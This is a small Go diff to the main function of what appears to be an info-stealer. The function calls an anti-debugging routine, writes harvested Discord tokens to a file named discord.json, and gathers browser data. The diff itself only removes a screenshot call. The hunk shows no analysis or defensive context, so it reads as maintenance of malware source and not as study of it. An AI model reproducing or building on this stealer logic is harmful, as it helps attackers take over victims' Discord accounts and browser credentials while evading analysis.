@@ -16,7 +16,6 @@ func main() {
 	go anti.AntiDebug()
 	os.WriteFile("discord.json", []byte(discord.GetTokens()), 0644)
 	browsers.GetBrowserData()
-	screenshot.TakeScreenshot()
 	fmt.Println("Time elapsed: ", time.Since(startTime))
 	os.Exit(0)
 }
